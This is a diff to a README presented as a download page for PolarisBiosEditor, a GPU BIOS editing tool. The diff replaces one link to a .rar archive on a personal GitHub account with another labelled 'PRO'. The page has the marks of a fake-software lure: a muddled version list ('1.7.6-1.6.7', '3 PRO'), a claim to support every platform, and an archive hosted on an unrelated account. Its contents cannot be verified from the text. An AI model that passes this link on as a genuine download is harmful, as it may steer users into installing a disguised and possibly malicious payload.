@@ -1,7 +1,6 @@
 # PolarisBiosEditor (PBE 1.6.7, 1.7.0, 1.7.6, 3 PRO): Download for Windows/Linux/MacOS
 
-
-- [ ]  [Download PolarisBiosEditor 1.7.6-1.6.7](https://github.com/Gujjargit/Gujjargit/releases/download/pbeportable/PolarisBiosEditor-portable.rar)
+- [ ]  [Download PolarisBiosEditor](https://github.com/Gujjargit/PolarisBiosEditorPBE/releases/download/PBE-PRO/PolarisBiosEditor.rar)
 -----------------------------------------------------------------------------------------------------------------
 
 ![image](https://user-images.githubusercontent.com/98729987/212367484-718fe836-2feb-44a9-80fe-57efe1fb668b.png)
